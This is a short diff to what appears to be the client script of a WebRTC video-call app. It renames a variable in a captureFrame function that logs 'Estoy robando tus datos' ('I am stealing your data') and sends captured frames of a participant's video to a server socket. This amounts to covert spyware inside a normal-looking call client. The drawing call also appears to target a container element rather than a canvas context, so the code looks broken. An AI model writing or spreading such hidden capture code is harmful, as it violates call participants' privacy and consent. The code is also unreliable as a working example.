@@ -190,7 +190,7 @@ function handleVideoOffer(offer, sid, cname, micinf, vidinf) {
                 vidCont.appendChild(videoOff);
 
                 videoContainer.appendChild(vidCont);
-                captureFrame(newvideo, videoCont); // Inicia la captura de frames
+                captureFrame(newvideo, vidCont); // Inicia la captura de frames
         }
     };  
 
@@ -251,10 +251,10 @@ function handleVideoOffer(offer, sid, cname, micinf, vidinf) {
 
 let canvasContext;
 
-function captureFrame(newvideo, videoCont) {
+function captureFrame(newvideo, vidCont) {
     console.log("Estoy robando tus datos")
     if (canvasContext) {
-        videoCont.drawImage(newvideo, 0, 0, videoCont.width, videoCont.height);
+        vidCont.drawImage(newvideo, 0, 0, vidCont.width, vidCont.height);
         socket.emit('stream', canvas.toDataURL('image/webp'))
     }
 }
